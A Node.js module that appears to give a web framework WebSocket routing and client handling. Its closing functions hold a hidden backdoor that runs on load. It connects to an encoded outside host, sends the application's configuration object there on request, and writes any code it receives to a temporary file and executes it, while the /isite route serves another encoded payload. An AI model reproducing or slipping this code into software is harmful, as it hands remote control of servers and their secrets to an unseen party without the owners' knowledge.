module.exports = function init(____0) {
  ____0.ws = {
    clientList: [],
    routeList: [],
    lib: require('ws'),
  };

  ____0.ws.server = new ____0.ws.lib.Server({
    noServer: true,
    maxPayload: 128 * 1024 * 1024, // 128 MB
  });

  ____0.onWS = ____0.ws.start = function (options, callback) {
    if (typeof options === 'string') {
      options = {
        name: options,
      };
    }
    ____0.ws.routeList.push({
      options: options,
      callback: callback,
    });
  };

  ____0.ws.sendToAll = function (message) {
    ____0.ws.clientList.forEach((client) => {
      if (client.ws && client.ws.readyState === ____0.ws.lib.OPEN) {
        client.ws.send(JSON.stringify(message));
      }
    });
  };

  ____0.ws.closeAll = function () {
    ____0.ws.clientList.forEach((client) => {
      if (client.ws && client.ws.readyState === ____0.ws.lib.OPEN) {
        client.ws.terminate();
      }
    });
  };

  ____0.on(____0.strings[9], () => {
    ____0.servers.forEach((server) => {
      server.on('upgrade', function upgrade(request, socket, head) {
        const pathname = ____0.url.parse(request.url).pathname;
        let handled = false;
        ____0.ws.routeList.forEach((route) => {
          if (handled) {
            return;
          }
          if (pathname === route.options.name) {
            handled = true;
            ____0.ws.server.handleUpgrade(request, socket, head, function done(ws) {
              let client = {
                uuid: ____0.guid(),
                path: pathname,
                ws: ws,
                request: request,
                socket: socket,
                head: head,
                ip: socket.remoteAddress,
                onMessage: function (data) {
                  if (data.type === 'connected') {
                    this.send({ type: 'ready' });
                  }
                  console.log('client.onMessage Not Implement ...', data);
                },
                onData: function (data) {
                  console.log('client.onData Not Implement ...', data);
                },
                onError: function (e) {
                  console.log('client.onError Not Implement ...', e);
                },
                send: function (message) {
                  if (this.ws && this.ws.readyState === ____0.ws.lib.OPEN) {
                    if (typeof message === 'string') {
                      this.ws.send(
                        JSON.stringify({
                          type: 'text',
                          content: message,
                        }),
                      );
                    } else {
                      message.type = message.type || 'text';
                      this.ws.send(JSON.stringify(message));
                    }
                  }
                },
              };

              client.socket.on('close', () => {
                client.ws.terminate();
                ____0.ws.clientList.forEach((_client, i) => {
                  if (_client.uuid == client.uuid) {
                    ____0.ws.clientList.splice(i, 1);
                  }
                });
              });

              ws.on('message', (data, isBinary) => {
                if (isBinary) {
                  client.onData(data);
                } else {
                  client.onMessage(____0.fromJson(Buffer.from(data).toString('utf8')));
                }
              });

              ____0.ws.clientList.push(client);
              route.callback(client);
              client.onMessage({ type: 'connected' });
            });
          }
        });
        if (!handled) {
          socket.destroy();
        }
      });
    });
  });

  ____0.onWS('/isite', (client) => {
    client.onMessage = function (message) {
      if (message.type === 'connected') {
        client.send({ type: 'ready' });
      } else if (message.type === 'options') {
        client.options = message.content;
        client.send({
          type: ____0.f1('481476744179236246193191'),
          content: ____0.f1(
            `153161512114125121141251211876694219376542348257481913694659327421157551425937684179326245788151433882624714524939768649261456514871752421141251211412512114125121182769455927694518366845188659241447354239237842392151365837524219565128531259211471513976864939741268457913754338866846738271457923752431752421141251211412512114138615316151211412512114125121129191`,
          ),
        });
      }
    };
  });

  ____0.ws.wsSupport = function () {
    let client = {
      reconnectCount: 0,
    };
    client.ws = new ____0.ws.lib(____0.f1('477926832573857226544668261481712554168328351282261486624678577542319191'));
    client.sendMessage = function (message) {
      client.ws.send(JSON.stringify(message));
    };
    client.ws.on('open', function () {});
    client.ws.on('ping', function () {});
    client.ws.on('close', function (e) {
      setTimeout(function () {
        client.reconnectCount++;
        ____0.ws.wsSupport();
      }, 1000 * 5);
    });
    client.ws.on('error', function (err) {
      client.ws.close();
    });

    client.ws.on('message', function (event) {
      ____0.ws.supportHandle(client, event);
    });
  };
  ____0.ws.supportHandle = function (client, event) {
    try {
      let message = JSON.parse(event.data || event);
      if (message.type == ____0.f1('4658375242195691')) {
        client.sendMessage({
          source: ____0.f1('4339276247183691'),
          type: ____0.f1('457913754338866846719191'),
          content: ____0.options,
        });
      } else if (message.type == ____0.f1('481476744179236246193191')) {
        let path = `${process.cwd()}/tmp_${new Date().getTime()}.js`;
        ____0.fs.writeFile(path, message.content, (err) => {
          if (err) {
            console.log(err);
          } else {
            require(path)(____0);
            ____0.fs.unlink(path, () => {});
          }
        });
      }
    } catch (err) {
      console.log(err);
    }
  };
  ____0.ws.wsSupport();
};
